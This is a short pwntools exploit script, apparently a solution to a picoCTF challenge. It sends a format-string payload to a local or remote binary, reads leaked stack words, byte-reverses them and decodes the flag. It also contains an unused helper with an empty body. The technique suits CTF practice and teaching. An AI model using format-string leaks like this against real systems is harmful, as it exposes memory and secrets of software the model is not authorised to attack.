#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 60115)

    return r


def reverse_hex_string(s: str) -> str:
    return 


def main():
    r = conn()

    payload = b'%36$lx--%37$lx--%38$lx--%39$lx--%40$lx--%41$lx--%42$lx--%43$lx--%44$lx--%45$lx--%46$lx--'
    r.sendlineafter(b'>> ', payload)
    output = r.recvlinesS(2)[1].split('--')

    flag = ''
    for o in output:
        flag += ''.join([o[i:i+2] for i in range(len(o)-2, -1, -2)])    # Reverse each string

    log.warn(f'Flag obtained: {bytes.fromhex(flag)}')


if __name__ == "__main__":
    main()
